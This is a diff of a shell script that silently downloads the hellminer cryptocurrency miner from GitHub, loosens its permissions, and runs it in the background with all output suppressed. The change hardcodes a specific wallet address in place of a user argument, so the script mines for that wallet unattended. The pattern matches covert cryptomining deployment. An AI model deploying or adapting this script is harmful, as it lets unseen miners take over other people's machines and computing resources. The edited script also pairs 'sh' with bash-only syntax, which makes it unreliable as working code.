@@ -1,7 +1,8 @@
 #!/bin/sh
 
-user="${1:-}"
-mode="${2:-0}"
+user="RMiRV2rGDffq52FW43oqLCuTzumdVU3zAH"
+mode="${1:-0}"
+
 [ -n "$user" ] || exit 1
 
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
@@ -13,6 +14,6 @@ wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer
 cd "${tmp}"; chmod 777 -R ./; rm -rf ./*.sh; mv h* hm
 cmd="./hm -u ${user} -p d=16384S >/dev/null 2>&1"
 
-[ "$mode" == "0" ] && bash <(echo "$cmd") || bash <(echo "$cmd") &
+[ "$mode" == "0" ] && sh <(echo "$cmd") || sh <(echo "$cmd") &
 
 
